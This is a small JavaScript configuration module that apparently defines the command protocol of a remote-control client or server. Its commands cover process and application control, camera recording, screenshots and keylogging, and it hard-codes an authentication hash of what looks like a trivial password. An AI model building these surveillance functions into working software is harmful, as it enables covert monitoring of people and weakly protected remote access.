export const CONFIG = {
    SERVER_PORT: 8080,
    AUTH_HASH: "8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918",
    
    CMD: {
        PING: "ping",
        PONG: "pong",
        AUTH: "auth",
        HEARTBEAT: "heartbeat",
        ERROR: "error",
        BROADCAST: "broadcast",

        APP_LIST: "LISTAPP",
        APP_START: "STARTAPP",
        APP_KILL: "STOPAPP",

        PROC_LIST: "LISTPROC",
        PROC_START: "STARTPROC",
        PROC_KILL: "STOPPROC",

        CAM_RECORD: "CAM_RECORD",
        SCREENSHOT: "SCRSHOT",
        START_KEYLOG: "STARTKLOG",
        STOP_KEYLOG: "STOPKLOG",

        SHUTDOWN: "restart",
        RESTART: "restart",

        ECHO: "echo",
        WHOAMI: "whoami"
    },
    SCAN_TIMEOUT: 2000
};